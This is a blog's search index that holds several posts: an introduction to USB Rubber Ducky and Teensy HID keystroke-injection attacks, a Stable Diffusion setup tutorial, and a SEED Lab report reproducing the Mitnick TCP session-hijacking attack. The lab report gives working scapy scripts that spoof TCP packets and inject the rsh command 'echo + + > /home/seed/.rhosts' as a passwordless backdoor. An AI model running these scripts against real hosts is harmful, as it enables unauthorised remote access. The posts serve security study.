<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>鼠标右键添加新建md文档</title>
    <url>/posts/feb04467.html</url>
    <content><![CDATA[<p>直接上链接：</p>
<p><a href="%5B(36%E6%9D%A1%E6%B6%88%E6%81%AF">鼠标右键添加新建.md文档（亲测有效）</a> Windows下右键新建.md文件教程（转）_右键新建md文件_MercyDean的博客-CSDN博客](<a href="https://blog.csdn.net/qq_43564374/article/details/109471694">https://blog.csdn.net/qq_43564374/article/details/109471694</a>))</p>
]]></content>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB</title>
    <url>/posts/30b50265.html</url>
    <content><![CDATA[<p>本文转载自[BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB](<a href="https://cloud.tencent.com/developer/article/1036206">BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB - 腾讯云开发者社区-腾讯云 (tencent.com)</a>)</p>
<p><strong>一、介绍</strong></p>
<p>前段时间翻译了有关BadUSB的两篇文章《解密BadUSB：世界上最邪恶的USB外设》和《研究人员公布BadUSB攻击测试（exploit）代码》，大家反应强烈，很多人都在打听BadUSB的实现方法，或者从那里可以买到这样的U盘。原本打算本周写一篇分析已公开的BadUSB利用代码，兑现一下诺言，但实在是抽不出时间。在此先给大家介绍一下BadUSB的“老前辈”：USB RUBBER DUCKY和Teensy，满足一下大家的好奇心。USB RUBBER DUCKY和Teensy都可用于实施HID模拟攻击，其中USB RUBBER DUCKY入手简单，傻瓜式操作，但价格不菲啊；而Teensy USB性价比比较高，也可用来制作各种酷炫的DIY。</p>
<p><strong>二、USB RUBBER DUCKY（USB 橡皮鸭）</strong></p>
<p><strong>1.介绍</strong></p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/ed4ijlzf2s.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p>USB RUBBER DUCKY（USB 橡皮鸭）是最早的按键注入工具。自2010年以来，USB橡皮鸭就一直深受黑客、<a href="https://cloud.tencent.com/product/wpt?from=20065&from_column=20065">渗透测试</a>人员以及IT专家的欢迎。USB 橡皮鸭最初作为一个IT自动化概念验证（POC），通过嵌入式开发板实现的，后来它发展成为一个完全成熟的商业化按键注入攻击平台。USB橡皮鸭通过简单的脚本语言、强大的硬件以及出色的伪装成功俘获了黑客的“芳心”。（谁能想到这么可爱的大黄鸭）</p>
<p>不管是笔记本、台式机、平板以及智能手机，几乎每个计算机都通过键盘获得输入。这就是为什么会有一个无处不在的USB标准HID或人机接口设备（Human Interface Device）。任何一个宣称是键盘HID的设备都能够被大多数操作系统自动的探测和接入。不管它是Windows、Mac或安卓设备，键盘就是老大。</p>
<p><strong>Freebuf小科普</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable constant_">HID</span>（<span class="title class_">Human</span> <span class="title class_">Interface</span> <span class="title class_">Device</span>）人机接口设备类别是<span class="title class_">Windows</span>最早支持的<span class="variable constant_">USB</span>类别。由其名称可以了解<span class="variable constant_">HID</span>设备是计算机直接</span><br><span class="line">与人交互的设备，例如键盘、鼠标和游戏杆等。不过<span class="variable constant_">HID</span>设备不一定要有人机接口，只要符合<span class="variable constant_">HID</span>类别规范，就都是<span class="variable constant_">HID</span>设备。</span><br></pre></td></tr></table></figure>

<p>复制</p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/shli98ytmx.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p>USB橡皮鸭的名字和背后的原理都源自美国一句俗语“ If it looks like a duck,quacks like a duck and walks like a duck,it’s a duck”（意思就是如果走路和叫声都像鸭子,那就是鸭子）。人类使用键盘，而计算机相信人类，进而推论出计算机相信键盘。结合计算机对键盘的固有信任和速度超过1000字&#x2F;分钟的通过脚本模拟的按键操作，传统的安全对策都能够被USB橡皮鸭轻易的绕过，即<strong>HID模拟攻击</strong>。</p>
<p><strong>2.特点</strong></p>
<p><strong>1).简单易用的脚本语言</strong></p>
<p>USB 橡皮鸭所使用的脚本语言Duckyscript简单易用，编写payload并不需要任何编程经验。而且现支持在线定制Payload：<a href="http://www.ducktoolkit.com/Home.jsp%E3%80%82%E5%8F%AA%E9%9C%80%E8%A6%81%E7%AE%80%E5%8D%95%E7%9A%84%E4%B8%89%E4%B8%AA%E6%AD%A5%E9%AA%A4%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%88%9B%E5%BB%BA%E5%8A%9F%E8%83%BD%E5%BC%BA%E5%A4%A7%E7%9A%84Payload%EF%BC%9A">http://www.ducktoolkit.com/Home.jsp。只需要简单的三个步骤，就可以创建功能强大的Payload：</a></p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/b04ikzq8e6.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p>USB 橡皮鸭已有的Payload模块如下表所示：</p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/wfj19szsx9.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p><strong>2).功能强大的定制硬件</strong></p>
<p>USB 橡皮鸭使用自定制的硬件设备，具有更大的处理能力和功能性多样化，硬件当然是收费的——39.99$。</p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/kym8q93sqw.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p>硬件特点：</p>
<p>①快速的60MHZ 32位处理器</p>
<p>②便捷的Type A USB连接器</p>
<p>③可通过Micro SD卡扩展内存</p>
<p>④隐藏在不起眼的外壳中</p>
<p>⑤内置载荷重按钮</p>
<p><strong>3).跨平台特性</strong></p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/qrbeq5wvtg.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p>不管是Windows、Linux、Mac还是Android（当然是不算触摸屏了），各个系统平台所遵守的USB标准都是一致的。所以USB RUBBER DUCKY自然而然就具有了跨平台的特点。</p>
<p><strong>4).活跃的交流社区</strong></p>
<p>USB RUBBER DUCKY拥有自己社区版固件、编码器以及工具箱，具有良好的交流沟通平台：</p>
<p><a href="https://forums.hak5.org/index.php?/forum/56-usb-rubber-ducky/">https://forums.hak5.org/index.php?/forum/56-usb-rubber-ducky/</a></p>
<p><strong>3.攻击测试步骤</strong></p>
<p>①下载网站生成的inject.bin载荷文件；</p>
<p>②把文件microSD卡的根目录；</p>
<p>③把microSD卡插入到USB橡皮鸭</p>
<p>④在USB橡皮鸭插入到目标系统中</p>
<p>⑤当看到命令提示窗口时，移除USB橡皮鸭；</p>
<p><strong>三、Teensy USB</strong></p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/ai7k06jlz9.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p>Teensy是一套完整的基于USB微控制器的开发系统，在占用极少资源的情况下可以实现多种多样的项目。所有的编程都是通过USB端口进行的。不需要特殊的编程器，只需要一个标准的Mini-B USB线缆、一台带有USB口的PC机或Macintosh机。</p>
<p><strong>主要特点</strong>：</p>
<p>①可以变身为任意类型的设备</p>
<p>②AVR处理器，16 MHz</p>
<p>③单按钮编程</p>
<p>④易于使用的Teensy Loader应用程序</p>
<p>⑤免费软件开发工具</p>
<p>⑥兼容Mac OS X，Linux和Windows</p>
<p>⑦便携,许多项目的完美支持</p>
<p>⑧使用标签面包板</p>
<p>⑨非常低的成本</p>
<p>你可能问我Teensy能干什么？我会说，你应该问我Teensy不能干什么！，装X必备的神器之一。</p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/ldd1fn950p.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p>关于Teensy如何实现HID模拟攻击，我就不贴具体内容了，详情大家可以查看一下文章：</p>
<ol>
<li>一个U盘黑掉你：HID攻击之TEENSY实战</li>
<li><a href="http://sec.chinabyte.com/410/13056910.shtml">http://sec.chinabyte.com/410/13056910.shtml</a></li>
<li></li>
<li>Teensy HID新型攻击方式（Kautilya渗透测试套件）</li>
</ol>
<p><strong><a href="http://www.xocoder.com/archives/1328">http://www.xocoder.com/archives/1328</a></strong> </p>
<p><strong>四、总结</strong></p>
<p>HID（Human Interface Devices）攻击当前不流行，但是攻击方式很新颖，实用性很高，危险系数应该还是比较高的，值得研究。BadUSB公布的利用代码借鉴了以上两个项目中的一些思路，但这两个项目和BadUSB还是有比较大的区别：</p>
<p>①USB RUBBER DUCKY和Teensy都需要定制的硬件设备，通用性差，而BadUSB针对的是通用的USB设备；</p>
<p>②USB RUBBER DUCKY和Teensy不能够自动复制传播，仅实现了从USB设备-&gt;计算机的单向感染途径，缺少计算机-&gt;USB设备的感染途径，仅适用于定点攻击（Targeted attack），危害程度大大削弱；</p>
<p>③USB RUBBER DUCKY和Teensy可以实现HID模拟攻击，尚未实现插入恶意代码的功能；</p>
<p><strong>参考链接：</strong></p>
<p><strong>1.USB Rubber Ducky主页：<a href="http://192.64.85.110/index.php">http://192.64.85.110/index.php</a></strong></p>
<p><strong>2.Teensy USB Development Board：<a href="http://www.pjrc.com/teensy/">http://www.pjrc.com/teensy/</a></strong></p>
<p><strong>3.一个U盘黑掉你：HID攻击之TEENSY实战：<a href="http://sec.chinabyte.com/410/13056910.shtml">http://sec.chinabyte.com/410/13056910.shtml</a></strong></p>
<p><strong>4.Teensy HID新型攻击方式（Kautilya渗透测试套件）<a href="http://www.xocoder.com/archives/1328">http://www.xocoder.com/archives/1328</a></strong></p>
<p><strong>[原文作者Rabbit_Run，喜欢文章请点赞鼓励。转载请注明来自FreeBuf.COM。免责声明：以上介绍的技术仅作为测试验证目的]</strong></p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>AI绘图工具以及使用教程</title>
    <url>/posts/75b509d1.html</url>
    <content><![CDATA[<h2 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h2><p>先放一下结果吧，本人机器只有GTX1650，所以生成的图片质量以及分辨率十分有限~</p>
<p><img src="https://img.xhacgn.com/images/2023/04/20/00001-1891544376.png" alt="00001-1891544376.png"></p>
<p><img src="https://img.xhacgn.com/images/2023/04/20/00005-1891544376.png" alt="00005-1891544376.png"></p>
<p><img src="https://img.xhacgn.com/images/2023/04/20/00009-2832915632.png" alt="00009-2832915632.png"></p>
<p><img src="https://img.xhacgn.com/images/2023/04/20/00036-3604192810.png" alt="00036-3604192810.png"></p>
<p><img src="https://img.xhacgn.com/images/2023/04/20/00050-4188726228.png" alt="00050-4188726228.png"></p>
<p><img src="https://img.xhacgn.com/images/2023/04/20/00066-114514.png" alt="00066-114514.png"></p>
<p><img src="https://img.xhacgn.com/images/2023/04/20/00069-1234567891f55fa507eb30f6a.png" alt="00069-1234567891f55fa507eb30f6a.png"></p>
<p>大概就是这样，模型可以在<a href="https://civitai.com/">civatai</a>（需魔法）和[Hugging Face](<a href="https://huggingface.co/">Hugging Face – The AI community building the future.</a>)中找。</p>
<h2 id="stable-diffusion-webui工具安装"><a href="#stable-diffusion-webui工具安装" class="headerlink" title="stable-diffusion-webui工具安装"></a>stable-diffusion-webui工具安装</h2><p>[stable-diffusion官网](<a href="https://github.com/AUTOMATIC1111/stable-diffusion-webui">AUTOMATIC1111&#x2F;stable-diffusion-webui: Stable Diffusion web UI (github.com)</a>)在这里，可以参照里面的Readme文档指示进行安装。环境Windows，Linux皆可，python版本最好是3.10（否则可能有一些包会安装失败），无需手动安装pytorch，官方Readme文档里有提到点击运行webui-user.bat（Windows系统，后面都是以windows系统为例）即可自动安装相应包体组件。另外一点需要注意，如果你想要使用python虚拟环境，例如conda，可以编辑webui-user.bat中PYTHON的地址为你的conda环境python地址。</p>
<p>在运行webui-user.bat之前，你需要先下载模型放到指定位置，这里推荐几个模型作为示例，</p>
<ul>
<li><a href="%5Bcivitai.com%5D(https://civitai.com/models/4468/counterfeit-v25)">counterfeit-v25</a>(需魔法）：下载得到.safesensor文件放入\stable-diffusion-webui-master\models\Stable-diffusion路径下。这个文件夹下必须至少有一个模型文件，.safesensor, .ckpt文件皆可。</li>
</ul>
<p>下面是几个模型文件例子，可以自行百度查找。<img src="https://img.xhacgn.com/images/2023/04/20/a40c51e8c197fdf4871351c6e6868664.png" alt="a40c51e8c197fdf4871351c6e6868664.png"></p>
<p>然后就可以直接点击运行webui-user.bat文件，运行过程中如果出现报错，请确认你的python版本正确（一般命令行报错信息会提示你），然后如果显示安装失败，那么大概率是网络问题，请检查你的网络配置，代理是否开启，然后关闭命令行重新运行。</p>
<p>安装好后，就可以按照命令行提示打开<a href="http://127.0.0.1:7860/%E7%84%B6%E5%90%8E%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%BE%93%E5%85%A5prompts%E4%BB%A5%E5%8F%8A%E5%90%84%E7%A7%8D%E5%8F%82%E6%95%B0%E8%BF%9B%E8%A1%8CAI%E7%BB%98%E5%9B%BE%E4%BA%86%EF%BC%81%E5%BD%93%E7%84%B6%E4%B8%80%E5%AE%9A%E8%A6%81%E6%B3%A8%E6%84%8F%E8%87%AA%E5%B7%B1%E7%9A%84%E6%98%BE%E5%8D%A1%E9%85%8D%E7%BD%AE%EF%BC%8C%E4%BE%8B%E5%A6%82%E6%9C%AC%E4%BA%BA4GB%E6%98%BE%E5%AD%98%E5%B0%B1%E5%8F%AA%E8%83%BD%E7%94%BB%E5%A4%A7%E6%A6%82900x400%E8%BF%99%E4%B8%AA%E5%88%86%E8%BE%A8%E7%8E%87%EF%BC%88%E5%8B%BE%E9%80%89hires.fix%E5%8F%82%E6%95%B0%E5%90%8E%EF%BC%89%EF%BC%8C%E4%B8%8D%E5%8B%BE%E9%80%89%E7%9A%84%E8%AF%9D%E6%9C%80%E5%A4%A7%E4%B9%9F%E5%B0%B1512x512">http://127.0.0.1:7860/然后就可以输入prompts以及各种参数进行AI绘图了！当然一定要注意自己的显卡配置，例如本人4GB显存就只能画大概900x400这个分辨率（勾选hires.fix参数后），不勾选的话最大也就512x512</a>~</p>
<h2 id="stable-diffusion-web-ui简要介绍"><a href="#stable-diffusion-web-ui简要介绍" class="headerlink" title="stable diffusion web ui简要介绍"></a>stable diffusion web ui简要介绍</h2><p><img src="https://img.xhacgn.com/images/2023/04/20/screenshot.png" alt="screenshot.png"></p>
<ul>
<li>stable diffusion checkpoint：你下载的模型，包含在上面提到的文件夹下的所有模型文件，可以选择任何一个模型进行加载。</li>
<li>Prompts：提示词，AI会根据该提示词进行绘制</li>
<li>Negative Prompts：负面提示词，AI会尽量避免里面的关键词</li>
<li>Sampling method：数据采样方式，没什么大影响</li>
<li>Sampling steps：采样步数，20-50就可以了，当然你再多一些也没关系，就是运行时间会久一些，还没试过效果会不会有明显改善</li>
<li><strong>Restore faces：</strong>在图象生成后再对面部进行优化，<strong>十分重要！！！</strong></li>
<li><strong>Hires.fix：</strong>可以将本来较小分辨率的图片再扩展成较大分辨率的图片</li>
<li>Batch Count：训练几张图片，串行生成</li>
<li>Batch Size：一次训练几张图片，并行生成</li>
<li>CFG Scale：AI绘图对Prompt的倾向性有多强。</li>
<li>Seed：种子，你可以按照我的世界的地图种子来理解。</li>
</ul>
<p>可以在<a href="https://civitai.com/">civatai</a>网站中找到自己喜欢的图片，里面会有相应的Prompts等参数，一般而言参数一模一样的话，产生的图也会比较相似。</p>
<p>下面给一个通用Prompts，用于画二次元少女图的</p>
<p>Prompt：masterpiece，beat quality，1girl</p>
<p>Negative Prompt：nsfw,blush,lowres, bad anatomy, bad hands, text, error, missing fingers, extra digit, fewer digits, cropped, worst quality, low quality, normal quality, jpeg artifacts,signature, watermark, username, blurry, artist name,bad feet,big head,fused body,multiple hands,multiple legs,multiple hands,multiple breast,multiple lower legs,multiple thighs,fused body,twist body</p>
<p>其他参数自己调就可以了。（只要不太过分都是没问题的~~~）</p>
]]></content>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>【SeedLab】MITNICK攻击实验</title>
    <url>/posts/7fdadce9.html</url>
    <content><![CDATA[<h2 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h2><p>KEVIN·MITNICK可能是美国最著名的黑客之一，他在联邦调查局的通缉犯名单上。在逃亡期间，他开始对破解移动网络产生了兴趣，并需要专门的软件来帮助他做到这一点。这让他找到了圣地亚哥超级计算机中心的研究员TSUTOMU SHIMOMURA，移动电话网络安全方面的主要研究人员之一。他有MITNICK想要的代码。</p>
<p>1994年，MITNICK利用TCP协议中的漏洞和SHIMOMURA的两台计算机之间的受信任关系，成功地对SHIMOMURA的计算机发动了一次攻击。这次袭击引发了两人之间的对决，并最终导致了MITNICK的被捕。这场对决后来被演变成书籍和好莱坞电影。这次攻击现在被称为MITNICK攻击，这是一种特殊类型的TCP会话劫持。</p>
<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>这个实验的目的是重现经典的MITNICK攻击，这样学生们就可以获得这种攻击的第一手经验。我们将模拟最初在SHIMOMURA电脑上的设置，然后启动MITNICK攻击，在SHIMOMURA的两台电脑之间创建一个伪造的TCP会话。如果攻击成功了，我们应该能够在SHIMOMURA的计算机上运行任何命令</p>
<h2 id="实验主题"><a href="#实验主题" class="headerlink" title="实验主题"></a>实验主题</h2><ul>
<li><p>TCP会话劫持攻击</p>
</li>
<li><p>TCP三次握手协议</p>
</li>
<li><p>MITNICK攻击</p>
</li>
<li><p>远程SHELL RSH</p>
</li>
<li><p>数据包嗅探与伪造</p>
</li>
</ul>
<h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><h4 id="1-使用docker容器建立实验环境"><a href="#1-使用docker容器建立实验环境" class="headerlink" title="1. 使用docker容器建立实验环境"></a>1. 使用docker容器建立实验环境</h4><p>在网站<a href="http://202.120.1.66:1068/">Home</a>下载相关的环境安装包，然后再Ubuntu系统中打开。使用命令<code>docker-compose up</code>完成环境搭建以及容器启动。</p>
<img src="/posts/7fdadce9/environment.png" class="" title="environment">

<h4 id="2-配置X-Terminal"><a href="#2-配置X-Terminal" class="headerlink" title="2. 配置X-Terminal"></a>2. 配置X-Terminal</h4><p>使用<code>docker exec -it [container-ID] /bin/bash</code>命令进入<code>x-terminal</code>主机，创建.rhost文件，添加<code>trust_server</code>主机IP地址</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su seed</span><br><span class="line">cd ~</span><br><span class="line">touch .rhosts</span><br><span class="line">echo 10.9.0.6 &gt; .rhosts</span><br><span class="line">chmod 644 .rhosts</span><br></pre></td></tr></table></figure>

<img src="/posts/7fdadce9/x_terminal_rsh_config.png" class="" title="x_terminal_rsh_config">

<p>配置完成后，使用<code>Trust Server</code>主机进行<code>rsh</code>登录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su seed</span><br><span class="line">rsh 10.9.0.5 date</span><br></pre></td></tr></table></figure>

 <img src="/posts/7fdadce9/x_terminal_rsh_config_verify.png" class="" title="x_terminal_rsh_config_verify">

<p>另外还需要设置<code>arp</code>长期缓存，因为如果在进行<code>mitnick</code>攻击时，如果<code>X-Terminal</code>主机中没有<code>Trust Server</code>主机的<code>arp</code>缓存，<code>X-Terminal</code>会发出<code>arp</code>报文请求<code>Trust Server</code>MAC地址，然而<code>Trust Server</code>由于收到<code>SYN FLOODING</code>攻击无法给予回复，导致攻击无法继续向下进行。</p>
<h4 id="3-模拟SYN-FLOODING攻击"><a href="#3-模拟SYN-FLOODING攻击" class="headerlink" title="3. 模拟SYN FLOODING攻击"></a>3. 模拟SYN FLOODING攻击</h4><p>由于当前主机都可以很好的防护SYN FLOODING攻击，可以直接关闭<code>Trust Server</code>主机来模拟SYN FLOODING攻击成功。</p>
<h4 id="4-建立第一个TCP连接——伪造SYN包"><a href="#4-建立第一个TCP连接——伪造SYN包" class="headerlink" title="4. 建立第一个TCP连接——伪造SYN包"></a>4. 建立第一个TCP连接——伪造SYN包</h4><p>令<code>Trust Server</code>主机rsh远程登录<code>X-Terminal</code>主机，tcpdump查看包交互过程，如下图，可见<code>10.9.0.5</code>与<code>10.9.0.6</code>之间建立了两次TCP连接（<code>10.9.0.5:514 &lt;-&gt; 10.9.0.6:1023</code>, <code>10.9.0.5:1023 &lt;-&gt; 10.9.0.6:1022</code>）</p>
<img src="/posts/7fdadce9/tcp_dump.png" class="" title="tcp_dump">

<p><code>mitnick</code>攻击实验进行TCP连接过程如下图：</p>
<img src="/posts/7fdadce9/TCP.png" class="" title="TCP">



<p>使用<code>python scapy</code>库构造脚本，伪造SYN包，向<code>X-Terminal</code>伪造<code>Trust Server</code>发送SYN包，尝试建立连接。</p>
<p><code>python</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.发送第一个SYN包</span></span><br><span class="line">ip = IP(src=<span class="string">&quot;10.9.0.6&quot;</span>, dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">tcp = TCP(sport=<span class="number">1023</span>, dport=<span class="number">514</span>)</span><br><span class="line">tcp.flags = <span class="string">&quot;S&quot;</span></span><br><span class="line">p = ip / tcp</span><br><span class="line">send(p, verbose=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>构造ip头以及tcp，注意tcp源端口需要为”1023”，标志位需要为”S”，向<code>X-Terminal</code>主机发送SYN包。</p>
<h4 id="5-建立第一个TCP连接——伪造SYN-ACK响应包"><a href="#5-建立第一个TCP连接——伪造SYN-ACK响应包" class="headerlink" title="5. 建立第一个TCP连接——伪造SYN-ACK响应包"></a>5. 建立第一个TCP连接——伪造SYN-ACK响应包</h4><p>发送SYN包后，<code>X-Terminal</code>会发送SYN+ACK响应包，<code>Attacker</code>主机需要伪造ACK响应包回复。其中包含了 ip, tcp, data等信息，data数据中包含了<code>touch /home/seed/xyz</code>命令。</p>
<p><code>python</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.伪造SYN+ACK响应包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> pkt[TCP].flags == <span class="string">&quot;SA&quot;</span> <span class="keyword">and</span> pkt[IP].src == <span class="string">&quot;10.9.0.5&quot;</span>:</span><br><span class="line">        old_ip = pkt[IP]</span><br><span class="line">        old_tcp = pkt[TCP]</span><br><span class="line">        tcp_len = old_ip.<span class="built_in">len</span> - old_ip.ihl * <span class="number">4</span> - old_tcp.dataofs * <span class="number">4</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;:&#123;&#125; -&gt; &#123;&#125;:&#123;&#125; Flags=&#123;&#125; Len=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(old_ip.src, old_tcp.sport, old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))</span><br><span class="line"></span><br><span class="line">        ip = IP(src=<span class="string">&quot;10.9.0.6&quot;</span>, dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">        tcp = TCP(sport=<span class="number">1023</span>, dport=pkt[TCP].sport)</span><br><span class="line">        tcp.flags = <span class="string">&quot;A&quot;</span></span><br><span class="line">        tcp.seq = pkt[TCP].ack</span><br><span class="line">        tcp.ack = pkt[TCP].seq + <span class="number">1</span></span><br><span class="line">        <span class="comment"># 伪造rsh数据包</span></span><br><span class="line">        data = <span class="string">&quot;9090\x00seed\x00seed\x00echo + + &gt; /home/seed/.rhosts\x00&quot;</span></span><br><span class="line">        p = ip / tcp / data</span><br><span class="line">        send(p, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">myFilter = <span class="string">&#x27;tcp&#x27;</span>  <span class="comment"># You need to make the filter more specific</span></span><br><span class="line">sniff(iface=<span class="string">&#x27;br-ac4a3b4d5a3d&#x27;</span>, <span class="built_in">filter</span>=myFilter, prn=spoof)</span><br></pre></td></tr></table></figure>

<p>进行sniff嗅探<code>X-Terminal</code>主机发送的SYN+ACK包，根据该包构造ip头和tcp头，设置标志位为”A”表示ACK包，注ack序号应为SYN+ACK包的<code>seq+1</code>，并添加rsh data数据段，添加命令，命令格式为<code>[port_number]\x00[uid_client]\x00[uid_server]\x00[your command]\x00</code>  。</p>
<p>数据包括四个部分：一个端口号、 一个客户端的用户ID、 一个服务器的用户ID和一个命令。该端口号将用于第二个连接。 客户端和服务器的用户ID在本实验中都为”seed” 。 这四个字段用一个字节0分隔。</p>
<h4 id="6-建立第二个TCP连接——伪造ACK包"><a href="#6-建立第二个TCP连接——伪造ACK包" class="headerlink" title="6. 建立第二个TCP连接——伪造ACK包"></a>6. 建立第二个TCP连接——伪造ACK包</h4><p>建立第一个连接后，X-Terminal将启动第二次连接，rshd使用此连接来发送错误消息。在本实验中，这个连接不 会被使用。但如果这个连接没有建立，rshd将停止而不执行命令。因此，需要伪造第二个连接来确保命令的执行。  </p>
<p>编写另一个程序，嗅探发送到可信服务器9090端口的TCP流量（假设之前使用9090端口）。当嗅探到一个SYN包时，应该用一个SYN+ACK包来响应。</p>
<p>如果两个连接都已成功建立， 则rshd将执行包含在rsh数据包中的命令。 检查&#x2F;home&#x2F;seed&#x2F;文件夹， 并查看是否创建了&#x2F;home&#x2F;seed&#x2F;， 以及其时间戳是否与当前的时间相匹配 。</p>
<p><code>python</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.伪造SYN响应包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> pkt[TCP].flags == <span class="string">&quot;S&quot;</span> <span class="keyword">and</span> pkt[IP].src == <span class="string">&quot;10.9.0.5&quot;</span>:</span><br><span class="line">        old_ip = pkt[IP]</span><br><span class="line">        old_tcp = pkt[TCP]</span><br><span class="line">        tcp_len = old_ip.<span class="built_in">len</span> - old_ip.ihl * <span class="number">4</span> - old_tcp.dataofs * <span class="number">4</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;:&#123;&#125; -&gt; &#123;&#125;:&#123;&#125; Flags=&#123;&#125; Len=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(old_ip.src, old_tcp.sport, old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))</span><br><span class="line"></span><br><span class="line">        ip = IP(src=<span class="string">&quot;10.9.0.6&quot;</span>, dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">        tcp = TCP(sport=<span class="number">9090</span>, dport=pkt[TCP].sport)</span><br><span class="line">        tcp.flags = <span class="string">&quot;SA&quot;</span></span><br><span class="line">        tcp.seq = pkt[TCP].seq</span><br><span class="line">        tcp.ack = pkt[TCP].seq + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        p = ip / tcp</span><br><span class="line">        send(p, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">myFilter = <span class="string">&#x27;tcp&#x27;</span>  <span class="comment"># You need to make the filter more specific      </span></span><br><span class="line">sniff(iface=<span class="string">&#x27;br-ac4a3b4d5a3d&#x27;</span>, <span class="built_in">filter</span>=myFilter, prn=spoof)</span><br></pre></td></tr></table></figure>

<p>进行sniff嗅探<code>X-Terminal</code>主机发送第二次TCP连接的SYN包，根据该包构造ip头和tcp头，设置标志位为”SA”表示SYN+ACK包，注意ack序号应为SYN包的<code>seq+1</code>，seq序号可以随意设计。</p>
<p>进行tcpdump查看包交互过程：</p>
<img src="/posts/7fdadce9/sniff.png" class="" title="sniff">

<p><strong>结果检验：</strong></p>
<img src="/posts/7fdadce9/results.png" class="" title="results">



<h4 id="7-设置后门"><a href="#7-设置后门" class="headerlink" title="7. 设置后门"></a>7. 设置后门</h4><p>为了避免每次侵入X-Terminal都需要发动攻击， 可以在X-Terminal上设置一个后门，这个后门允许攻击者无需输入密码就能在任何时候正常地登录到X-Terminal。实现这个后门需要做的就是将字符串“+ +” 添加到X-Terminal的 .rhosts 文件中，将脚本中data数据段命令修改为<code>echo + + &gt; /home/seed/.rhosts</code>即可。</p>
<p><code>python</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">&quot;9090\x00seed\x00seed\x00echo + + &gt; /home/seed/.rhosts\x00&quot;</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p>成功修改了<code>.rhosts</code>文件</p>
<img src="/posts/7fdadce9/result1.png" class="" title="result1">

<p>使用攻击主机进行rsh登录，成功返回日期时间</p>
<img src="/posts/7fdadce9/result2.png" class="" title="result2">

<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>通过本次实验，我了解了当时mitnick进行攻击的具体过程以及实现原理。并且能够简单复现该攻击实验，并且熟练掌握了docker的使用方法。</p>
]]></content>
      <tags>
        <tag>网络攻防</tag>
        <tag>mitnick</tag>
        <tag>实验报告</tag>
        <tag>seed_lab</tag>
      </tags>
  </entry>
  <entry>
    <title>某二次元游戏私服搭建总结</title>
    <url>/posts/af718253.html</url>
    <content><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>经过大概几个小时的配置环境并debug，终于把Genshin Impact和星穹铁道的私服配置好了。中间也学到了很多东西，以下对整个过程做一个总结。</p>
